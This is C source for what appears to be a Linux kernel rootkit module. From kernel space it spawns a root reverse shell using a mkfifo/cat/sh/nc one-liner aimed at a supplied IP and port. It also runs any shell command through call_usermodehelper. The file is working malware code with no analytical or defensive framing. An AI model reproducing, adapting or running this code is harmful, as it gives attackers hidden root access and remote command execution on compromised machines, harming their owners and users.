#include "../include/utils.h"


#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm"
#define SHELL "/bin/bash"
#define EXEC_P1 "/bin/rm /tmp/fifo;/usr/bin/mkfifo /tmp/fifo;/bin/cat /tmp/fifo|/bin/sh -i 2>&1|/bin/nc "
#define EXEC_P2 " >/tmp/fifo"


void execute_reverse_shell(struct work_struct *work){
    //We know the strings are allocated right after the work in the struct shell_params, so we cast it
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL}; //Null terminated
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    memset(exec, 0, 256);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
    strcat(exec, " ");
    strcat(exec, params->target_port);
    strcat(exec, EXEC_P2);
    printk(KERN_INFO "Starting reverse shell %s\n", exec);
    
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

void execute_command(struct work_struct *work) {
    int err, exit_code;
    struct command_params *params = (struct command_params*)work;
    char *envp[] = {HOME, TERM, PATH, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    memset(exec, 0, 256);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, params->command);
    printk(KERN_INFO "Executing command %s\n", exec);
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (err < 0) {
        printk(KERN_ERR "run_cmd(\"%s\"): kernel error %d\n", exec, err);
    } else {
        exit_code = (err >> 8) & 0xff;
        if (exit_code)
            printk(KERN_WARNING "run_cmd(\"%s\"): exited with code %d\n", exec, exit_code);
        else
            printk(KERN_INFO "run_cmd(\"%s\"): success\n", exec);
    }
    kfree(exec);
    kfree(params->command);
    kfree(params);
}

int start_reverse_shell(char* ip, char* port){
    //Reserve memory for parameters and start work
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    printk(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "Error scheduling work of starting shell\n");
    }
    return err;

}

int run_cmd(char *cmd)
{
    struct command_params *params;

    if (!cmd)
        return -EINVAL;

    params = kmalloc(sizeof(*params), GFP_KERNEL);
    if (!params)
        return -ENOMEM;

    params->command = kstrdup(cmd, GFP_KERNEL);
    if (!params->command) {
        kfree(params);
        return -ENOMEM;
    }

    INIT_WORK(&params->work, execute_command);

    if (!schedule_work(&params->work)) {
        kfree(params->command);
        kfree(params);
        return -EBUSY;
    }

    return 0;
}
